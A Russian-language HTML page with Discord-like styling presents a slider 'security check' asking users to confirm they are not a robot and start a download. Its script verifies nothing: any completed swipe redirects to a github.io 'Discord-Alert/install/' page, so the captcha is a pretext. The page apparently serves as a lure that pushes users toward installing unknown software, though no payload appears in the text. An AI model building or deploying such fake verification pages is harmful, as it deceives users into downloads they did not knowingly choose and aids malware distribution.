<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение действия</title>
    <style>
        body { margin: 0; font-family: sans-serif; background: #F2F2F2; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .android-box { background: white; width: 320px; padding: 30px; border-radius: 28px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        .icon-shield { width: 60px; height: 60px; margin-bottom: 20px; }
        h2 { font-size: 20px; margin: 0 0 10px; color: #333; }
        p { font-size: 14px; color: #777; margin-bottom: 30px; }
        .slider-container { width: 100%; height: 60px; background: #EEE; border-radius: 30px; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .slider-text { font-size: 14px; color: #999; user-select: none; z-index: 1; }
        .slider-handle { width: 50px; height: 50px; background: #5865F2; border-radius: 25px; position: absolute; left: 5px; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 2; transition: transform 0.1s; }
        .slider-handle::after { content: '→'; color: white; font-weight: bold; }
        .success-msg { color: #43B581; display: none; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>

<div class="android-box">
    <img src="https://icons8.com" class="icon-shield" alt="Shield">
    <h2>Проверка безопасности</h2>
    <p>Проведите вправо, чтобы подтвердить, что вы не робот и начать загрузку</p>
    
    <div class="slider-container" id="container">
        <span class="slider-text" id="text">Проведите для загрузки</span>
        <div class="slider-handle" id="handle"></div>
    </div>
    <p id="status" class="success-msg">Подтверждено! Загрузка...</p>
</div>

<script>
    const handle = document.getElementById('handle');
    const container = document.getElementById('container');
    const status = document.getElementById('status');
    let isDragging = false;
    let isFinished = false;

    // Обработка мыши
    handle.addEventListener('mousedown', () => isDragging = true);
    document.addEventListener('mousemove', drag);
    document.addEventListener('mouseup', endDrag);

    // Обработка касаний (смартфоны)
    handle.addEventListener('touchstart', () => isDragging = true);
    document.addEventListener('touchmove', (e) => drag(e.touches[0]));
    document.addEventListener('touchend', endDrag);

    function drag(e) {
        if (!isDragging || isFinished) return;
        
        let rect = container.getBoundingClientRect();
        let pos = e.clientX - rect.left - 25;
        
        if (pos < 5) pos = 5;
        if (pos > rect.width - 55) {
            pos = rect.width - 55;
            onSuccess();
        }
        handle.style.left = pos + 'px';
    }

    function endDrag() {
        if (!isDragging || isFinished) return;
        isDragging = false;
        if (parseInt(handle.style.left) < (container.offsetWidth - 60)) {
            handle.style.transition = '0.3s';
            handle.style.left = '5px';
            setTimeout(() => handle.style.transition = '0.1s', 300);
        }
    }

    function onSuccess() {
        isFinished = true;
        isDragging = false;
        container.style.display = 'none';
        status.style.display = 'block';

        // 1. Ставим метку сессии
        sessionStorage.setItem('captcha_passed', 'true');

        // 2. Редирект с четким указанием пути и слешем в конце
        setTimeout(() => {
            window.location.href = "https://albeepython.github.io/Discord-Alert/install/";
        }, 800);
    }
</script>

</body>
</html>
